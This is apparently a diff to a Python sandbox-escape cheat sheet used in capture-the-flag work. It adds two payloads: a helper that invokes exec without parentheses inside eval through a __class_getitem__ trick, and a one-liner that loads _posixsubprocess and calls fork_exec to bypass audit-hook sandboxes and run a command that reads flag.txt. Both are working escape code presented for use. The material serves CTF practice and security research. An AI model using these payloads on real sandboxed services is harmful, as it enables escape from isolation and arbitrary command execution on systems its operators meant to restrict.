@@ -213,6 +213,27 @@ async def a():pass
 a().cr_frame.f_globals
 ```
 
+### No (), inside eval
+```py
+
+# _ is a class (eg. `class _:pass`)
+
+def call_function(f, arg):
+        return (f"[[None for _.__class_getitem__ in [{f}]],"
+                f"_[{arg}]][True]")
+
+# call_function("exec", "'breakpoint()'")
+# output: [[None for _.__class_getitem__ in [exec]],_['breakpoint()']][True]
+
+```
+
+### Bypass audit sandboxes
+```py
+
+__builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", b'flag.txt'], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__('os').pipe()), False, False, None, None, None, -1, None)
+
+```
+
 ### OOB Read using LOAD_FAST
 ```py
 # Thanks to @splitline, https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc
